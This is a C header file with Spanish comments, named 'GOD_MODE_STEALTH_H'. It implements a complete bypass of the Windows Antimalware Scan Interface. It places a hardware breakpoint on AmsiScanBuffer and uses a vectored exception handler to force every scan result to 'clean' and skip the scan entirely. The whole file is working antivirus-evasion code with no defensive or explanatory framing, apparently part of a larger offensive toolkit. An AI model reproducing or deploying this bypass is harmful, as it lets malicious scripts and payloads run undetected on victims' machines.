#ifndef GOD_MODE_STEALTH_H
#define GOD_MODE_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"

// =============================================================================
// ESTRUCTURA DE ESTADO DEL HARDWARE BREAKPOINT
// =============================================================================

typedef struct _HWBP_STATE {
    PVOID TargetAddress;
    DWORD DrIndex;        // 0-3 (Dr0-Dr3)
    DWORD DrControlMask;  // Bits de control en Dr7
    BOOL  IsActive;
} HWBP_STATE, *PHWBP_STATE;

static HWBP_STATE g_HwbpState = {0};
static PVOID g_pAmsiScanBuffer = NULL;

// =============================================================================
// HANDLER DE EXCEPCIÓN VECTORIZADO — SEGURO Y COMPLETO
// =============================================================================

static LONG CALLBACK HardwareBreakpointHandler(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
    PEXCEPTION_RECORD pRecord = ExceptionInfo->ExceptionRecord;
    PCONTEXT pCtx = ExceptionInfo->ContextRecord;
    
    if (pRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    if (pRecord->ExceptionAddress != g_HwbpState.TargetAddress) {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    DWORD bpTriggered = (pCtx->Dr6 & 0x0F);
    if (!(bpTriggered & (1 << g_HwbpState.DrIndex))) {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    // Modificar el AMSI_RESULT* (arg6 en x64 stack: [RSP + 0x30])
    PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
    __try {
        if (pResult && !IsBadWritePtr(pResult, sizeof(DWORD))) {
            *pResult = 0; // AMSI_RESULT_CLEAN
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
    
    pCtx->Rax = 0; // S_OK
    
    // Avanzar RIP al RET más cercano para evitar ejecutar AMSI
    PBYTE pFunc = (PBYTE)g_pAmsiScanBuffer;
    SIZE_T scanLen = 0x200;
    
    __try {
        for (SIZE_T i = 0; i < scanLen; i++) {
            if (pFunc[i] == 0xC3) { // RET
                pCtx->Rip = (DWORD64)(pFunc + i + 1);
                break;
            }
            if (pFunc[i] == 0xC2) { // RET imm16
                pCtx->Rip = (DWORD64)(pFunc + i + 3);
                break;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
    
    // Limpiar registros de depuración para evitar bucle
    pCtx->Dr0 = 0;
    pCtx->Dr1 = 0;
    pCtx->Dr2 = 0;
    pCtx->Dr3 = 0;
    pCtx->Dr7 = 0x400; 
    pCtx->Dr6 = 0;
    
    g_HwbpState.IsActive = FALSE;
    
    return EXCEPTION_CONTINUE_EXECUTION;
}

// =============================================================================
// INSTALACIÓN DE HARDWARE BREAKPOINT
// =============================================================================

static BOOL InstallHWBP(_In_ PVOID targetAddress, _In_ DWORD drIndex) {
    if (!targetAddress || drIndex > 3) return FALSE;
    
    g_HwbpState.TargetAddress = targetAddress;
    g_HwbpState.DrIndex = drIndex;
    g_HwbpState.IsActive = TRUE;
    g_pAmsiScanBuffer = targetAddress;
    
    if (!AddVectoredExceptionHandler(1, HardwareBreakpointHandler)) return FALSE;
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) return FALSE;
    
    switch (drIndex) {
        case 0: ctx.Dr0 = (DWORD64)targetAddress; break;
        case 1: ctx.Dr1 = (DWORD64)targetAddress; break;
        case 2: ctx.Dr2 = (DWORD64)targetAddress; break;
        case 3: ctx.Dr3 = (DWORD64)targetAddress; break;
    }
    
    ctx.Dr7 |= (1 << (drIndex * 2));
    ctx.Dr7 &= ~(3 << (16 + drIndex * 4)); // Condition: Execute
    ctx.Dr7 &= ~(3 << (18 + drIndex * 4)); // Size: 1 byte
    
    return SetThreadContext(hThread, &ctx);
}

// =============================================================================
// BYPASS AMSI VIA HARDWARE BREAKPOINT
// =============================================================================

static BOOL BypassAMSI_HWBP() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;
    
    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;
    
    return InstallHWBP(pAmsiScanBuffer, 0);
}

#endif
